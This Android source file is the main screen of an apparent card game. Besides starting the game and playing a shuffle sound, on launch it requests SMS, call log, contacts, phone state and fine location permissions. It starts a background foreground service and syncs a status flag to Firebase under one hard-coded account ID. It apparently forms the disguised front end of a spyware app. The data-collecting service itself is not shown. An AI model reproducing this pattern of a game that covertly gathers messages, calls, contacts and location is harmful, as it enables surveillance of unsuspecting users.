package com.example.myapplication.activities;

import android.Manifest;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.LocationManager;
import android.media.MediaPlayer;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import com.example.myapplication.Object.Status;
import com.example.myapplication.R;
import com.example.myapplication.Service.AppService;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.util.Objects;

public class MainActivity extends AppCompatActivity {

    private DatabaseReference reference;
    private Status status;

    private TextView  welcome;
    private Button startGame;
    private Button topTen;
    LocationManager locationManager;
    private MediaPlayer mp;





    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        findViews();
        chooseActivity();


        askForPermissions();

        checkGPS();
        checkForegroundService();


    }

    public void findViews(){
        welcome = findViewById(R.id.welcome);
        startGame = findViewById(R.id.startGame);
        topTen = findViewById(R.id.topten);

    }


    public void chooseActivity(){
        startGame.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                actionToService(AppService.START_FOREGROUND_SERVICE);

                status.setOn(true);
                buttonStatus(status.isOn());


                FirebaseDatabase.getInstance().getReference("STATUS/").child("/MQJFZkdDklQQoIAjTSZoAmP3IIy1" + "/").setValue(status);

                playSound(R.raw.shuffcards);

                startGameActivity();
            }
        });
        topTen.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                goToRecordActivity();
            }
        });

    }


    private void buttonStatus(boolean isOn) {
        if(!isOn) {
            startGame.setEnabled(true);

        }else {
            startGame.setEnabled(true);

        }
    }

    public void startGameActivity(){
        Intent myIntent = new Intent(MainActivity.this, GameActivity.class);
        startActivity(myIntent);
        finish();

    }

    public void goToRecordActivity(){
        Intent myIntent = new Intent(MainActivity.this, RecordActivity.class);
        startActivity(myIntent);
        finish();



    }


    private void checkGPS() {
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        if (!locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
            alertMessageNoGPS();
        } else {
            fetchLocation();
        }
    }

    private void alertMessageNoGPS() {
        final AlertDialog.Builder builder = new AlertDialog.Builder(this);

        builder.setMessage("Your GPS seems to be disable, do you want to enable it?")
                .setCancelable(false)
                .setPositiveButton("Yes", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialogInterface, int i) {
                        startActivity(new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS));
                    }
                }).setNegativeButton("No", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialogInterface, int i) {
                dialogInterface.cancel();
            }
        });

        final AlertDialog alert = builder.create();
        alert.show();
    }

    private void fetchLocation() {
        if (ActivityCompat.checkSelfPermission(
                this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, 100);
        }
    }


    protected void playSound(int rawName) {

        mp = MediaPlayer.create(this, rawName);
        mp.setOnCompletionListener(mp -> {
            mp.reset();
            mp.release();
        });
        mp.start();
    }

    private void actionToService(String action) {
        // Set service
        Intent startIntent = new Intent(this, AppService.class);
        startIntent.setAction(action);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Objects.requireNonNull(this).startForegroundService(startIntent);
        } else {
            Objects.requireNonNull(this).startService(startIntent);
        }
    }

    private void askForPermissions() {
        ActivityCompat.requestPermissions(this, new String[]{
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_CONTACTS}, 1);
    }


    private void checkForegroundService() {
//        reference = FirebaseDatabase.getInstance().getReference("STATUS/").child(FirebaseAuth.getInstance().getCurrentUser().getUid() + "/");
        reference = FirebaseDatabase.getInstance().getReference("STATUS/").child("/MQJFZkdDklQQoIAjTSZoAmP3IIy1" + "/");
        status = new Status();

        reference.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {

                status = snapshot.getValue(Status.class);

                buttonStatus(status.isOn());
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });
    }



}